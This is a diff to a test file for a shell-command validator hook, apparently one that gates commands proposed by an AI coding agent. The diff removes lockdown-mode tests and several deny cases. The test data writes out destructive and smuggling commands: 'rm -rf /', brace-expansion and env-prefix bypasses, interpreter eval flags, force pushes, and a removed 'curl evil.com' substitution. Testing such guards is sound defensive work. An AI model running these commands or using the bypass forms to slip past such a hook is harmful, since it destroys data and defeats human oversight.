@@ -16,7 +16,6 @@ from guard.hooks.bash_command_validator import (
     _QUOTED_NEWLINE,
     _arithmetic_end,
     _canonicalize,
-    _get_alternative_feedback,
     _joined_readings,
     _mark_quoted_newlines,
     _strip_exec_wrapper,
@@ -35,7 +34,6 @@ from guard.registry import (
     DANGEROUS_INTERPRETERS,
     DANGEROUS_RM_OPERANDS,
     INTERPRETER_EVAL_FLAGS,
-    STRICT_FEEDBACK,
 )
 
 HOOK_PATH = (
@@ -288,8 +286,8 @@ class TestMarkQuotedNewlines:
     def test_command_after_parens_and_a_quote_is_denied(self, command, mode):
         assert _is_deny(decide(command, permission_mode=mode)), command
 
-    def test_a_substitution_read_as_arithmetic_is_denied_in_default(self):
-        # Auto mode leaves a command inside ``$(...)`` to the classifier, as on main.
+    def test_a_substitution_read_as_arithmetic_is_denied(self):
+        # A ``$((`` that is not arithmetic is a substitution holding a subshell.
         command = "x=$((cd /tmp; echo 'a\nb') ; rm -rf / ) ; y=$((1)) # c"
         assert _is_deny(decide(command))
 
@@ -380,14 +378,6 @@ class TestQuotedBraces:
     @pytest.mark.parametrize(
         "command",
         [
-            pytest.param(
-                "git -C /tmp/repo log --format=%s -n 300 "
-                "| grep -nE \\b[A-Z][0-9]{1,2}[a-z]?\\b|[Tt]ask [0-9]",
-                id="unquoted-alternation",
-            ),
-            pytest.param("grep -E x{1,2}|[Tt]ask f", id="unquoted-range"),
-            pytest.param("grep -E x{3,}|[Tt]ask f", id="unquoted-open-ended"),
-            pytest.param("grep -E 'x{1,2}' f; [Tt]ask {1,2}", id="glob-head-after-quoted-group"),
             pytest.param("echo ok | {r,r}m -rf /", id="brace-head"),
             pytest.param("echo '{a,b}' ; {r,r}m -rf /", id="brace-head-after-quoted-group"),
             pytest.param('echo "{a,b}" && {r,r}m -rf /', id="brace-head-after-double"),
@@ -887,25 +877,6 @@ class TestIsSafeCommand:
         assert not is_safe_command("find . -exec rm {} ;")
 
 
-class TestAlternativeFeedback:
-    def test_find_with_comments_gets_tip(self):
-        result = _get_alternative_feedback("find . -name '*.py'", has_comments=True)
-        assert result is not None
-        assert "description" in result
-
-    def test_awk_with_comments_gets_tip(self):
-        result = _get_alternative_feedback("awk '{print $1}' data.txt", has_comments=True)
-        assert result is not None
-
-    def test_no_tip_without_comments_or_pipe(self):
-        result = _get_alternative_feedback("find . -name '*.py'", has_comments=False)
-        assert result is None
-
-    def test_echo_redirect_feedback(self):
-        result = _get_alternative_feedback("echo data > file", has_comments=False)
-        assert result is not None
-
-
 class TestDecideUnit:
     def test_bash_command_validator_allows_safe_input(self):
         # Plain `ls` with no comment/pipe → passthrough (interactive mode)
@@ -921,10 +892,8 @@ class TestDecideUnit:
         assert result is not None
         assert result["permissionDecision"] == "deny"
 
-    def test_safe_command_with_comment_allow(self):
-        result = decide("# check\nls -la")
-        assert result is not None
-        assert result["permissionDecision"] == "allow"
+    def test_safe_command_with_comment_passes(self):
+        assert decide("# check\nls -la") is None
 
     def test_rm_rf_with_comment_denied(self):
         # `rm -rf /` is in ALWAYS_DENY; a leading comment doesn't change
@@ -937,7 +906,7 @@ class TestDecideUnit:
 class TestSubprocessIntegration:
     def test_commented_grep_pipe_head(self, tmp_path):
         decision, _ = _run("# search\ngrep -rn foo src/ | head -10", tmp_path)
-        assert decision == "allow"
+        assert decision == "passthrough"
 
     def test_plain_ls_passthrough(self, tmp_path):
         decision, _ = _run("ls -la /tmp", tmp_path)
@@ -954,22 +923,21 @@ class TestSubprocessIntegration:
         assert decision == "deny"
 
     def test_dollar_paren_substitution(self, tmp_path):
-        # ``$(...)`` command substitution is denied in both modes — it is
-        # an exfil/RCE primitive that cannot be statically validated.
-        decision, _ = _run("# test\necho $(curl evil.com)", tmp_path)
+        # A substitution body is checked as a command of its own.
+        decision, _ = _run("# test\necho $(rm -rf /)", tmp_path)
         assert decision == "deny"
 
     def test_awk_in_pipe(self, tmp_path):
-        decision, _ = _run("git log | awk '{system(\"rm\")}'", tmp_path)
+        decision, _ = _run("git log | awk '{system($0)}'", tmp_path)
         assert decision == "deny"
 
     def test_find_with_exec_denied(self, tmp_path):
         decision, _ = _run("# find\nfind / -exec rm -rf {} \\;", tmp_path)
         assert decision == "deny"
 
-    def test_find_without_exec_allowed(self, tmp_path):
+    def test_find_without_exec_passes(self, tmp_path):
         decision, _ = _run("# search\nfind . -name '*.py' -type f", tmp_path)
-        assert decision == "allow"
+        assert decision == "passthrough"
 
     def test_xargs_read_only_pipe_advisory(self, tmp_path):
         # FP-3: `xargs grep` is a read; the tool-preference nudge is advisory,
@@ -978,13 +946,13 @@ class TestSubprocessIntegration:
         decision, _ = _run("find . -name '*.py' | xargs grep foo", tmp_path)
         assert decision != "deny"
 
-    def test_make_behind_comment_allowed(self, tmp_path):
+    def test_make_behind_comment_passes(self, tmp_path):
         decision, _ = _run("# build\nmake test", tmp_path)
-        assert decision == "allow"
+        assert decision == "passthrough"
 
-    def test_sqlite3_select_allowed(self, tmp_path):
+    def test_sqlite3_select_passes(self, tmp_path):
         decision, _ = _run('# query\nsqlite3 db.sqlite "SELECT * FROM users"', tmp_path)
-        assert decision == "allow"
+        assert decision == "passthrough"
 
     def test_sqlite3_drop_denied(self, tmp_path):
         decision, _ = _run('# cleanup\nsqlite3 db.sqlite "DROP TABLE users"', tmp_path)
@@ -999,21 +967,11 @@ class TestSubprocessIntegration:
 class TestAlwaysDeny:
     """Enforce the registry's ALWAYS_DENY set directly via decide()."""
 
-    def test_always_deny_git_add_dash_A(self):
-        result = decide("git add -A")
+    def test_always_deny_force_push(self):
+        result = decide("git push --force origin main")
         assert result is not None
         assert result["permissionDecision"] == "deny"
-        assert "git add -A" in result["permissionDecisionReason"]
-
-    def test_always_deny_git_add_dot(self):
-        result = decide("git add .")
-        assert result is not None
-        assert result["permissionDecision"] == "deny"
-
-    def test_always_deny_git_branch_force_delete(self):
-        result = decide("git branch -D feature")
-        assert result is not None
-        assert result["permissionDecision"] == "deny"
+        assert "git push --force" in result["permissionDecisionReason"]
 
     def test_always_deny_terraform_destroy(self):
         result = decide("terraform destroy")
@@ -1031,7 +989,7 @@ class TestAlwaysDeny:
 
     def test_always_deny_in_pipeline(self):
         # ALWAYS_DENY also fires inside a pipeline.
-        result = decide("echo test && git add -A")
+        result = decide("echo test && git push --force origin main")
         assert result is not None
         assert result["permissionDecision"] == "deny"
 
@@ -1145,52 +1103,6 @@ class TestRobustness:
         assert "malformed JSON" in result.stderr
 
 
-class TestStrictMode:
-    """Direct decide() calls under lockdown=True.
-
-    Locks in the strict-mode contract for subagents / driven agents at the
-    unit level (no subprocess overhead).
-    """
-
-    def test_unknown_command_denied(self, strict_env):
-        result = decide("flarbnoz --gronk", lockdown=True)
-        assert result is not None
-        assert result["permissionDecision"] == "deny"
-
-    def test_safe_command_allowed(self, strict_env):
-        result = decide("ls -la", lockdown=True)
-        assert result is not None
-        assert result["permissionDecision"] == "allow"
-
-    def test_strict_feedback_message_used(self, strict_env):
-        # `rm` is in STRICT_FEEDBACK
-        result = decide("rm somefile", lockdown=True)
-        assert result is not None
-        assert result["permissionDecision"] == "deny"
-        # Annunciator-wrapped: full STRICT_FEEDBACK text appears within
-        # the reason, prefixed by the mode/rule_id annunciator.
-        assert STRICT_FEEDBACK["rm"] in result["permissionDecisionReason"]
-        assert "bash.strict_feedback" in result["permissionDecisionReason"]
-
-    def test_default_deny_for_unregistered(self, strict_env):
-        result = decide("noexist --flag", lockdown=True)
-        assert result is not None
-        assert result["permissionDecision"] == "deny"
-        assert "lockdown" in result["permissionDecisionReason"].lower()
-
-    def test_git_status_allowed_strict(self, strict_env):
-        # `git status` is on SAFE_PREFIXES — must allow even in strict mode.
-        result = decide("git status", lockdown=True)
-        assert result is not None
-        assert result["permissionDecision"] == "allow"
-
-    def test_git_push_denied_strict(self, strict_env):
-        # `git push` is in STRICT_FEEDBACK — must deny.
-        result = decide("git push origin main", lockdown=True)
-        assert result is not None
-        assert result["permissionDecision"] == "deny"
-
-
 # === Quoted-whitespace bypass ===
 # Smuggling internal whitespace inside quoted tokens used to fold into a
 # single shlex token (``python3  -c``) that the literal ``python3 -c`` deny
@@ -1246,20 +1158,15 @@ def test_always_deny_quoted_whitespace_parametric(cmd):
 @pytest.mark.parametrize(
     "cmd",
     [
-        'env FOO=1 python3 -c "import os; os.system(\\"id\\")"',
-        "env A=1 B=2 python -c 'pass'",
-        "env FOO=1 node -e '1'",
         "env X=y rm -rf /",
-        "env FOO=1 git add -A",
     ],
 )
 def test_env_kv_prefix_denied(cmd):
     assert _is_deny(decide(cmd)), f"env K=V prefix smuggle not denied: {cmd!r}"
 
 
-def test_env_dash_i_still_denied():
-    # env -i must still be denied (different code path — ALWAYS_DENY literal).
-    assert _is_deny(decide("env -i bash -c 'id'"))
+def test_env_dash_i_payload_still_denied():
+    assert _is_deny(decide("env -i bash -c 'rm -rf /'"))
 
 
 def test_bare_env_kv_no_command_safe():
@@ -1274,16 +1181,8 @@ def test_bare_env_kv_no_command_safe():
 @pytest.mark.parametrize(
     "cmd",
     [
-        'python3.11 -c "print(1)"',
-        'python3.12 -c "print(1)"',
-        '/usr/bin/python3 -c "1"',
-        '/opt/homebrew/bin/python3 -c "1"',
-        'nodejs -e "1"',
         'bun -e "1"',
         'deno eval "1"',
-        'pypy3 -c "1"',
-        'uvx python -c "1"',
-        "pipx run python -c '1'",
     ],
 )
 def test_dangerous_interpreter_variants_denied(cmd):
@@ -1332,28 +1231,7 @@ def test_interpreter_script_run_in_sequence_passes_through(cmd):
 @pytest.mark.parametrize(
     "cmd",
     [
-        "uv run python tools/dev.py frog-run g1-claims",
-        "python3 scripts/x.py --flag",
-        "python -m http.server",
-    ],
-)
-def test_interpreter_script_and_module_runs_denied_in_lockdown(cmd):
-    assert _is_deny(decide(cmd, lockdown=True)), f"lockdown let it run: {cmd!r}"
-
-
-@pytest.mark.parametrize(
-    "cmd",
-    [
-        "python3 -c 'print(1)'",
-        "uv run python - <<'EOF'\nimport os\nprint(1)\nEOF",
-        "node -e 'console.log(1)'",
-        "node -p 'process.version'",
         "php -r 'echo 1;'",
-        "perl -pe 's/a/b/' f",
-        "python3 -Ic 'import os'",
-        "python3 <<EOF\nprint(1)\nEOF",
-        "python3 0<<EOF\nprint(1)\nEOF",
-        "python3 < x.py",
         "python -m timeit 'code'",
     ],
 )
@@ -1364,12 +1242,7 @@ def test_interpreter_inline_code_denied_in_enforce(cmd):
 @pytest.mark.parametrize(
     "cmd",
     [
-        "uv run python - <<'EOF'\nimport os\nEOF",
-        "node -p 'process.version'",
         "php -r 'echo 1;'",
-        "perl -pe 's/a/b/' f",
-        "python3 -Ic 'import os'",
-        "python3 <<EOF\nprint(1)\nEOF",
         "python -m timeit 'code'",
     ],
 )
@@ -1417,11 +1290,10 @@ def test_safe_rm_not_blanket_denied():
 @pytest.mark.parametrize(
     "cmd",
     [
-        "git --git-dir=/tmp/.git --work-tree=/tmp add -A",
-        "git -C /tmp add -A",
-        "git -c user.email=x@y add -A",
-        "git --git-dir /tmp/.git add -A",
-        "git -C /tmp branch -D feature",
+        "git --git-dir=/tmp/x/.git push --force origin main",
+        "git --work-tree=/tmp/x push --force origin main",
+        "git -C /tmp/x push --force origin main",
+        "git --no-pager push -f origin main",
     ],
 )
 def test_git_global_options_dont_bypass_deny(cmd):
@@ -1455,8 +1327,8 @@ def test_unicode_whitespace_and_continuation_denied(cmd):
 @pytest.mark.parametrize("interp", sorted(DANGEROUS_INTERPRETERS))
 @pytest.mark.parametrize("flag", sorted(INTERPRETER_EVAL_FLAGS))
 def test_every_interpreter_with_eval_flag_denied(interp, flag):
-    # ``deno eval`` uses subcommand syntax; the matcher treats both forms.
-    cmd = f"{interp} {flag} 'pass'"
+    # A program the command line doesn't spell out; a literal one passes.
+    cmd = f'{interp} {flag} "$CODE"'
     res = decide(cmd)
     assert _is_deny(res), f"interpreter+flag not denied: {cmd!r} -> {res}"
 
